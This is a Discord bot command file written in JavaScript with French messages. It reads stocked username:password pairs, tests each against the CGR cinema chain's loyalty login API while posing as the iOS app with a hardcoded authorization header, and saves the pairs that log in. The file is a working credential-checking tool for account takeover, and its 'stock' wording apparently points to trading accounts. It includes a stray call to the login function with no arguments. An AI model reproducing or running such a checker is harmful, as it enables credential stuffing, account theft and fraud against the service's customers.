const discord = require('discord.js')
const {prefix } = require('../config.json')
const request = require('sync-request');
const readline = require('readline');
const fs = require('fs');
const { send } = require('process');
module.exports ={
    name:"recheckcgr",
    description:"Commande permettant de recheck les comptes cgr en stock !",
    async execute(client , message){
        
        if (!message.member.hasPermission("ADMINISTRATOR")) return message.channel.send('Tu ne peux pas faire ça !')

        
        const embed = new discord.MessageEmbed()
        .setTitle(`**Les comptes cgr sont recheck veuillez entrez la commande "${prefix}recheckcgr2" Pour terminer le proccessus !**`)
        message.channel.send(embed)
        const fileStream2 = `${__dirname}/../stock/cgr2.txt`
        fs.writeFileSync(fileStream2,"", (err) => {console.log(err)})
     function all(){
        async function Hashing() { 
            const fileStream = fs.createReadStream(`${__dirname}/../stock/cgr.txt`); 
            
            const rl = readline.createInterface({ input: fileStream, crlfDelay: Infinity }); for await (const line   of rl) { 
                    var credarr = line.split(':') 
                    await automate(credarr[0], credarr[1]) }}
        
        Hashing();
        
        async function automate(username, password) {
            const cgred = request('POST',"https://prime.wmpro.uk/api/loyalty/login?returnProfile=true",{headers : {
                "Authorization": "Basic Y2dyOmNpbmVtenN0dWZmNGY=",
                "Locale-Code": "fr-FR",
                "Exhibitor-Code": "cgr",
                "Os-Type": "ios",
                "User-Agent":" CGR/5.3.14 (fr.cotecine.cgr; build:9; iOS 15.0.2) Alamofire/5.3.14",
                "Content-Type":"application/json"
            },json:{
                password:`${password}`,
                identifier:`${username}`
            }})
            if(cgred.statusCode === 200){
            fs.appendFileSync(fileStream2,`${username}:${password}\n`)
            
        }
        }
        
        automate()
    }


    await all()

}}
